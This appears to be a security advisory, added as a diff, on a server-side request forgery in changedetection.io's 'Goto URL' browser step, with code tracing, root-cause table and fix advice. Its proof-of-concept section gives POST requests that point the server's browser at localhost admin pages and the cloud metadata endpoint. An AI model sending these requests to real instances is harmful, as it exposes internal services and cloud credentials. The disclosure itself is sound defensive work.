@@ -1,0 +1,198 @@
+# Server-Side Request Forgery via Goto URL Browser Step (CWE-918)
+
+**BUG_Author:** herantong
+
+**Affected Version:** changedetection.io ≤ 0.55.8
+
+**Vendor:** [changedetection.io GitHub Repository](https://github.com/dgtlmoon/changedetection.io)
+
+**Software:** [changedetection.io](https://github.com/dgtlmoon/changedetection.io)
+
+**Vulnerability Files:**
+- `changedetectionio/browser_steps/browser_steps.py`
+- `changedetectionio/blueprint/browser_steps/__init__.py`
+- `changedetectionio/content_fetchers/base.py`
+
+---
+
+## Description
+
+### 1. Server-Side Request Forgery via Unsanitized Goto URL
+
+The `action_goto_url` method accepts a user-controlled `value` parameter and passes it directly to Playwright's `page.goto()` without any URL validation. This enables browser-based Server-Side Request Forgery (SSRF) attacks, allowing access to internal URLs, localhost services, and cloud metadata endpoints (CWE-918).
+
+### 2. Vulnerable Code Location
+
+The vulnerability is at `changedetectionio/browser_steps/browser_steps.py:134-142`:
+
+```python
+# changedetectionio/browser_steps/browser_steps.py:134-142
+async def action_goto_url(self, selector=None, value=None):
+    if not value:
+        logger.warning("No URL provided for goto_url action")
+        return None
+
+    now = time.time()
+    response = await self.page.goto(value, timeout=0, wait_until='load')
+    logger.debug(f"Time to goto URL {time.time()-now:.2f}s")
+    return response
+```
+
+The `value` parameter is passed directly to `self.page.goto()` without any validation, sanitization, or whitelist check. The `page` object is a Playwright page running in a server-side headless browser context.
+
+### 3. Interactive Attack Path via HTTP Endpoint
+
+At `changedetectionio/blueprint/browser_steps/__init__.py:352-391`:
+
+```python
+@browser_steps_blueprint.route("/browsersteps_update", methods=['POST'])
+@login_optionally_required
+def browsersteps_ui_update():
+    step_operation = request.form.get('operation')
+    step_selector = request.form.get('selector')
+    step_optional_value = request.form.get('optional_value')
+    run_async_in_browser_loop(
+        browsersteps_sessions[browsersteps_session_id]['browserstepper'].call_action(
+            action_name=step_operation,
+            selector=step_selector,
+            optional_value=step_optional_value
+        )
+    )
+```
+
+`step_optional_value` comes directly from `request.form.get('optional_value')`, a user-controlled HTTP POST form field. When `step_operation` is `"Goto URL"`, the value flows directly to `action_goto_url` as the `value` parameter.
+
+### 4. Automated Attack Path via Watch Configuration
+
+At `changedetectionio/content_fetchers/base.py:191-219`:
+
+```python
+async def iterate_browser_steps(self, start_url=None):
+    for step in valid_steps:
+        optional_value = step['optional_value']
+        selector = step['selector']
+        await getattr(interface, "call_action")(action_name=step['operation'],
+                                            selector=selector,
+                                            optional_value=optional_value)
+```
+
+`optional_value` comes from `step['optional_value']`, stored in a watch's `browser_steps` configuration. These steps are configured by the user via the UI or API and executed during subsequent automated fetches.
+
+### 5. Existing SSRF Protections Do Not Cover Browser Steps
+
+The project provides URL validation utilities in `changedetectionio/validate_url.py` (`is_safe_valid_url`, `is_url_private_or_parser_confused`, `is_private_hostname`). These are used in the following contexts:
+
+- Watch URL validation on creation (`changedetectionio/model/Watch.py:279, :300`)
+- IANA private IP blocking during fetching (`changedetectionio/processors/base.py:110`)
+- Request fetcher redirect validation (`changedetectionio/content_fetchers/requests.py:93, :116`)
+- LLM API base URL validation (`changedetectionio/validate_url.py:136`)
+
+However, none of these validators are applied to the `optional_value` of the "Goto URL" browser step, either in the interactive `/browsersteps_update` endpoint or the automated `iterate_browser_steps` fetch path. The `validate_iana_url()` check at `processors/base.py:110` validates only `self.watch.link`, not individual browser step values.
+
+### 6. Weakened Browser Security Controls
+
+Both browser context creation points set `bypass_csp=True` and `ignore_https_errors=True`:
+
+`changedetectionio/browser_steps/browser_steps.py:359-368`:
+```python
+self.context = await self.playwright_browser.new_context(
+    accept_downloads=False,
+    bypass_csp=True,
+    extra_http_headers=self.headers,
+    ignore_https_errors=True,
+    proxy=proxy,
+)
+```
+
+`changedetectionio/content_fetchers/playwright.py:285-293`:
+```python
+context = await browser.new_context(
+    accept_downloads=False,
+    bypass_csp=True,
+    extra_http_headers=request_headers,
+    ignore_https_errors=True,
+    proxy=self.proxy,
+)
+```
+
+These settings allow the browser to load content from sites with CSP restrictions and invalid TLS certificates, amplifying SSRF impact.
+
+### 7. Authentication Context
+
+```python
+@browser_steps_blueprint.route("/browsersteps_update", methods=['POST'])
+@login_optionally_required
+```
+
+The `login_optionally_required` decorator only enforces authentication when the application has a password configured. If no password is set, the endpoint is accessible without authentication. Even when authentication is required, this remains an authenticated SSRF vulnerability.
+
+---
+
+## Proof of Concept
+
+### 1. Access Internal Services via Interactive Endpoint
+
+```
+POST http://<target-host>/browsersteps_update
+Content-Type: application/x-www-form-urlencoded
+
+operation=Goto URL&optional_value=http://127.0.0.1:8080/admin
+```
+
+### 2. Access Cloud Metadata Endpoint
+
+```
+POST http://<target-host>/browsersteps_update
+Content-Type: application/x-www-form-urlencoded
+
+operation=Goto URL&optional_value=http://169.254.169.254/latest/meta-data/
+```
+
+### 3. Persistent SSRF via Watch Configuration
+
+Configure a watch with a browser step containing an internal URL. On each scheduled fetch, the server-side browser navigates to the internal target, enabling persistent information gathering or internal service interaction.
+
+### 4. Attack Flow
+
+1. An attacker sends a POST request to `/browsersteps_update` with `operation=Goto URL` and `optional_value` set to an internal URL.
+2. The unsanitized URL reaches `action_goto_url` and is passed to `page.goto()`.
+3. The server-side Playwright browser navigates to the internal URL.
+4. The attacker can access internal services, cloud metadata endpoints, or localhost services.
+5. With `bypass_csp=True` and `ignore_https_errors=True`, CSP and TLS restrictions are disabled, maximizing reachable targets.
+
+---
+
+## Root Cause Analysis
+
+| Question | Answer |
+|---|---|
+| Does user-controlled input influence the URL/host of a server-side request? | Yes — in the interactive path, `request.form.get('optional_value')` flows directly to `page.goto()`. In the automated path, user-configured `step['optional_value']` also reaches `page.goto()`. |
+| Is the target hostname/URL validated against a whitelist? | No — no whitelist validation exists for browser step values. |
+| Is the resolved IP checked against internal/private ranges? | No — `validate_iana_url()` in `processors/base.py` applies only to `self.watch.link`, not browser step values. |
+| Is only the path/query portion user-controlled with a hardcoded host? | No — the entire URL including protocol and host is user-controlled. |
+| Does the project already have SSRF defenses that could be reused? | Yes — `is_private_hostname()` and `is_url_private_or_parser_confused()` exist in `validate_url.py` but are not applied to browser steps. |
+| Are browser security controls hardened? | No — `bypass_csp=True` and `ignore_https_errors=True` amplify SSRF impact. |
+| Is the code in a test, demo, or dead-code context? | No — it is live production code reachable via HTTP endpoint and background worker. |
+
+**Verdict: Confirmed vulnerability (CWE-918 — Server-Side Request Forgery).**
+
+---
+
+## Fix Recommendations
+
+1. **Add URL Validation Before `page.goto()`**: In `action_goto_url`, validate the URL using the existing utilities in `changedetectionio/validate_url.py`. Use `is_private_hostname()` or `is_url_private_or_parser_confused()` to reject URLs resolving to private/reserved IP ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16).
+
+2. **Restrict URL Scheme**: Limit the URL scheme to `http://` and `https://` only, rejecting `file://`, `javascript:`, `data:`, and other non-HTTP schemes.
+
+3. **Reject URLs with Backslashes**: Prevent parser-differential bypasses by rejecting URLs containing backslashes (already handled by the existing `is_url_private_or_parser_confused()`).
+
+4. **Validate at the Earliest Entry Point**: Apply URL validation to browser step `optional_value` at the `/browsersteps_update` endpoint and when saving browser steps via the watch edit form/API, in addition to the sink validation in `action_goto_url`.
+
+5. **Verify Both Paths**: After implementing the fix, verify that both the automated `iterate_browser_steps` fetch path and the interactive browser step UI endpoint are covered by the same validation logic.
+
+---
+
+## References
+
+- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
+- [Playwright `page.goto()` documentation](https://playwright.dev/python/docs/api/class-page#page-goto)
